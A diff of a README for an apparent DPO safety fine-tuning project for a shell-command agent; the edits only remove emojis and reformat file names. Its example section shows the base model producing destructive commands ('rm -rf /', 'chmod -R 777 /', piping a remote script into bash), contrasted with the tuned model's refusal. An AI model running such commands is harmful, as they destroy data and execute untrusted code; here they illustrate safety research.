@@ -23,9 +23,9 @@ The result is an agent that:
 
 ---
 
-# ✨ Key Features
+# Key Features
 
-## 🧠 Custom DPO Implementation
+## Custom DPO Implementation
 
 A fully custom PyTorch implementation of the Direct Preference Optimization objective.
 
@@ -44,7 +44,7 @@ Instead of using abstraction-heavy RLHF libraries, this project implements:
 
 ---
 
-## ⚡ Async Synthetic Data Generation with Trio
+## Async Synthetic Data Generation with Trio
 
 Large-scale preference pair generation powered by **Python Trio** concurrency.
 
@@ -135,7 +135,7 @@ This is critical for command-generation tasks where:
 
 ## File Breakdown
 
-### `generate_data.py`
+### "generate_data.py"
 Asynchronous synthetic dataset generation engine using Trio.
 
 Generates:
@@ -146,7 +146,7 @@ Generates:
 
 ---
 
-### `train_dpo.py`
+### "train_dpo.py"
 Core DPO training loop.
 
 Contains:
@@ -158,7 +158,7 @@ Contains:
 
 ---
 
-### `eval_pipeline.py`
+### "eval_pipeline.py"
 Agentic evaluation harness with constitutional critique.
 
 Features:
@@ -169,7 +169,7 @@ Features:
 
 ---
 
-### `constitutional_dpo_dataset.jsonl`
+### "constitutional_dpo_dataset.jsonl"
 Example preference dataset containing:
 - prompts,
 - safe completions,
@@ -178,7 +178,7 @@ Example preference dataset containing:
 
 ---
 
-# 📊 Experimental Results
+# Experimental Results
 
 DPO fine-tuning produced substantial improvements in autonomous safety behavior while preserving general coding capability.
 
@@ -191,7 +191,7 @@ DPO fine-tuning produced substantial improvements in autonomous safety behavior 
 
 ## Example Behavioral Shift
 
-### ❌ Base Model
+### Base Model
 
 ```bash
 rm -rf /
@@ -199,7 +199,7 @@ chmod -R 777 /
 curl malicious.sh | bash
 ```
 
-### ✅ DPO-Tuned Model
+### DPO-Tuned Model
 
 ```text
 This command is unsafe because it can irreversibly damage the filesystem.
@@ -259,7 +259,7 @@ The results suggest that:
 
 ---
 
-# 🔐 Safety Philosophy
+# Safety Philosophy
 
 The system is designed around:
 - **Least Privilege**
@@ -275,7 +275,7 @@ Rather than aggressively refusing all risky behavior, the model attempts to:
 
 ---
 
-# 📈 Future Work
+# Future Work
 
 - Multi-turn constitutional reasoning
 - Sandboxed execution environments
@@ -293,7 +293,7 @@ Licensed under the Apache-2.0 License.
 
 ---
 
-# 🤝 Contributions
+# Contributions
 
 Pull requests, critiques, and research discussions are welcome.
 
